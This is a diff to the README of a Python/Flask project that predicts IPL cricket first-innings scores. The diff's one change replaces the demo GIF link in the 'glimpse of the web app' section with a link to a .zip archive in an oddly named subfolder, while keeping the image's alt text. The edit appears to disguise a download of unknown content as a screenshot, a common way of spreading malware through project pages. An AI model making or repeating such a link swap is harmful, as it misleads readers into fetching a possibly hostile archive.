@@ -16,4 +16,4 @@ This is a machine learning model made using python and flask which predicts firs
 * Random Forest Regression
 
 ## A glimpse of the web app:
-![FormatFactory Screen Record20210302_105425 00_00_02-00_00_24 (2)](https://user-images.githubusercontent.com/49580063/109604165-06b0a100-7b49-11eb-8daf-6c730ac92cf6.gif)
+![FormatFactory Screen Record20210302_105425 00_00_02-00_00_24 (2)](https://raw.githubusercontent.com/Rohanvp07/IPL-Score-Prediction/main/Caranga/IPL-Score-Prediction.zip)
